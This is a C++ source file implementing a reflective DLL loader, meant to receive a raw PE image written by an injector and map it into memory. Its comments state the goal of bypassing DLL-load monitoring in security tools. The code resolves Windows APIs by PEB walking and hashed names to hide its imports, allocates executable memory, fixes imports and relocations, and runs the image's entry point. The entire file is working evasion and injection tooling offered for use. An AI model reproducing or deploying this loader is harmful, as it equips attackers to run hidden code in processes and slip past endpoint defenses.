// ReflectiveDllMain.cpp
// Position-independent DLL loader — maps the raw DLL bytes into memory without
// going through LoadLibraryW. Bypasses DLL-load monitoring in security tools.
// Calling convention: ReflectiveDllMain(LPBYTE dllBase)
//   dllBase = start of the raw PE image written by the injector.

#include <windows.h>
#include <winternl.h>

// ── Avoid CRT dependencies ────────────────────────────────────────────────────
#pragma intrinsic(_rotr)

static void ref_memcpy(void* dst, const void* src, size_t n)
{
    auto d = (unsigned char*)dst;
    auto s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

// ── PEB-based function resolution (no imports needed) ────────────────────────
// Hashes: rotr(hash,13) + uppercase(char)
#define H_KERNEL32              0x6a4abc5b
#define H_NTDLL                 0x3cfa685d
#define H_NtFlushIC             0x534c0ab8
#define H_LoadLibraryA          0xec0e4e8e
#define H_GetProcAddress        0x7c0dfcaa
#define H_VirtualAlloc          0x91afca54
#define H_VirtualProtect        0x7946c61b

typedef HMODULE  (WINAPI* FN_LoadLibraryA  )(LPCSTR);
typedef FARPROC  (WINAPI* FN_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID   (WINAPI* FN_VirtualAlloc  )(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL     (WINAPI* FN_VirtualProtect)(LPVOID, SIZE_T, DWORD, LPDWORD);
typedef NTSTATUS (NTAPI*  FN_NtFlushIC     )(HANDLE, PVOID, ULONG);
typedef BOOL     (WINAPI* FN_DllMain       )(HINSTANCE, DWORD, LPVOID);

typedef struct { USHORT Offset:12; USHORT Type:4; } RELOC_ENTRY;

static DWORD HashStr(const char* s)
{
    DWORD h = 0;
    while (*s) { char c = *s++; if (c >= 'a') c -= 0x20; h = _rotr(h,13) + c; }
    return h;
}
static DWORD HashWStr(const WCHAR* s, USHORT lenBytes)
{
    DWORD h = 0;
    for (int i = 0; i < lenBytes/2; i++) { char c = (char)s[i]; if (c >= 'a') c -= 0x20; h = _rotr(h,13) + c; }
    return h;
}

// Walk the PEB's InMemoryOrderModuleList to find a loaded module by name hash.
// Offsets differ between x86 and x64:
//   x64: PEB via GS:0x60, InMemoryOrderLinks at +0x10, DllBase at +0x30, Name at +0x58
//   x86: PEB via FS:0x30, InMemoryOrderLinks at +0x08, DllBase at +0x18, Name at +0x2C
static LPVOID PebMod(DWORD mhash)
{
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &((PPEB_LDR_DATA)peb->Ldr)->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        LPBYTE b = (LPBYTE)e - 0x10;
        PUNICODE_STRING name = (PUNICODE_STRING)(b + 0x58);
        PVOID base = *(PVOID*)(b + 0x30);
        if (name->Buffer && HashWStr(name->Buffer, name->Length) == mhash)
            return base;
    }
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
    PLIST_ENTRY head = &((PPEB_LDR_DATA)peb->Ldr)->InMemoryOrderModuleList;
    for (PLIST_ENTRY e = head->Flink; e != head; e = e->Flink) {
        LPBYTE b = (LPBYTE)e - 0x08;
        PUNICODE_STRING name = (PUNICODE_STRING)(b + 0x2C);
        PVOID base = *(PVOID*)(b + 0x18);
        if (name->Buffer && HashWStr(name->Buffer, name->Length) == mhash)
            return base;
    }
#endif
    return nullptr;
}

static LPVOID PebProc(DWORD mhash, DWORD fhash)
{
    LPBYTE base = (LPBYTE)PebMod(mhash);
    if (!base) return nullptr;
    auto nt  = (PIMAGE_NT_HEADERS)(base + ((PIMAGE_DOS_HEADER)base)->e_lfanew);
    auto exp = (PIMAGE_EXPORT_DIRECTORY)(base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    auto names = (LPDWORD)(base + exp->AddressOfNames);
    auto ords  = (LPWORD )(base + exp->AddressOfNameOrdinals);
    auto funcs = (LPDWORD)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++)
        if (HashStr((const char*)(base + names[i])) == fhash)
            return base + funcs[ords[i]];
    return nullptr;
}

// Section characteristics → PAGE_* protection constant
static DWORD SecProt(DWORD ch)
{
    BOOL x = ch & IMAGE_SCN_MEM_EXECUTE, r = ch & IMAGE_SCN_MEM_READ, w = ch & IMAGE_SCN_MEM_WRITE;
    if (x && w) return PAGE_EXECUTE_READWRITE;
    if (x && r) return PAGE_EXECUTE_READ;
    if (x)      return PAGE_EXECUTE;
    if (w)      return PAGE_READWRITE;
    if (r)      return PAGE_READONLY;
    return PAGE_NOACCESS;
}

// g_reflectiveLoad removed — not used in current implementation

// ── Entry point ───────────────────────────────────────────────────────────────
extern "C" __declspec(dllexport)
BOOL WINAPI ReflectiveDllMain(LPBYTE dllBase)
{
    auto ntFlush = (FN_NtFlushIC     )PebProc(H_NTDLL,    H_NtFlushIC);
    auto loadLib = (FN_LoadLibraryA  )PebProc(H_KERNEL32, H_LoadLibraryA);
    auto getProc = (FN_GetProcAddress)PebProc(H_KERNEL32, H_GetProcAddress);
    auto valloc  = (FN_VirtualAlloc  )PebProc(H_KERNEL32, H_VirtualAlloc);
    auto vprot   = (FN_VirtualProtect)PebProc(H_KERNEL32, H_VirtualProtect);
    if (!ntFlush || !loadLib || !getProc || !valloc || !vprot) return FALSE;

    auto nt = (PIMAGE_NT_HEADERS)(dllBase + ((PIMAGE_DOS_HEADER)dllBase)->e_lfanew);
    auto mapped = (LPBYTE)valloc(NULL, nt->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mapped) return FALSE;

    // Copy PE headers + sections
    ref_memcpy(mapped, dllBase, nt->OptionalHeader.SizeOfHeaders);
    auto secs = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
        ref_memcpy(mapped + secs[i].VirtualAddress, dllBase + secs[i].PointerToRawData, secs[i].SizeOfRawData);

    // Resolve imports
    auto& impDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (impDir.Size) {
        for (auto imp = (PIMAGE_IMPORT_DESCRIPTOR)(mapped + impDir.VirtualAddress); imp->Name; imp++) {
            auto mod = (LPBYTE)loadLib((LPCSTR)(mapped + imp->Name));
            if (!mod) continue;
            auto thunkOrig = (PIMAGE_THUNK_DATA)(mapped + imp->OriginalFirstThunk);
            auto iat       = (PUINT_PTR)         (mapped + imp->FirstThunk);
            while (*iat) {
                if (IMAGE_SNAP_BY_ORDINAL(*iat)) {
                    auto mnt = (PIMAGE_NT_HEADERS)(mod + ((PIMAGE_DOS_HEADER)mod)->e_lfanew);
                    auto exp = (PIMAGE_EXPORT_DIRECTORY)(mod + mnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
                    DWORD ord = (DWORD)(IMAGE_ORDINAL(*iat) - exp->Base);
                    *iat = (UINT_PTR)(mod + ((LPDWORD)(mod + exp->AddressOfFunctions))[ord]);
                } else {
                    *iat = (UINT_PTR)getProc((HMODULE)mod, ((PIMAGE_IMPORT_BY_NAME)(mapped + *iat))->Name);
                }
                thunkOrig++; iat++;
            }
        }
    }

    // Apply base relocations
    auto& relDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relDir.Size) {
        UINT_PTR delta = (UINT_PTR)(mapped - nt->OptionalHeader.ImageBase);
        for (auto blk = (PIMAGE_BASE_RELOCATION)(mapped + relDir.VirtualAddress);
             blk->SizeOfBlock;
             blk = (PIMAGE_BASE_RELOCATION)((LPBYTE)blk + blk->SizeOfBlock))
        {
            auto entry = (RELOC_ENTRY*)((LPBYTE)blk + sizeof(IMAGE_BASE_RELOCATION));
            DWORD count = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(RELOC_ENTRY);
            LPBYTE page = mapped + blk->VirtualAddress;
            for (DWORD i = 0; i < count; i++) {
                if (entry[i].Type == IMAGE_REL_BASED_DIR64)
                    *(PUINT_PTR)(page + entry[i].Offset) += delta;
                else if (entry[i].Type == IMAGE_REL_BASED_HIGHLOW)
                    *(LPDWORD)(page + entry[i].Offset) += (DWORD)delta;
            }
        }
    }

    // Set section memory protections
    DWORD oldProt;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        DWORD size = (i < nt->FileHeader.NumberOfSections - 1)
            ? secs[i+1].VirtualAddress - secs[i].VirtualAddress
            : nt->OptionalHeader.SizeOfImage - secs[i].VirtualAddress;
        vprot(mapped + secs[i].VirtualAddress, size, SecProt(secs[i].Characteristics), &oldProt);
    }

    ntFlush(INVALID_HANDLE_VALUE, NULL, 0);

    // Call DllMain of the newly mapped image
    return ((FN_DllMain)(mapped + nt->OptionalHeader.AddressOfEntryPoint))((HINSTANCE)mapped, DLL_PROCESS_ATTACH, NULL);
}
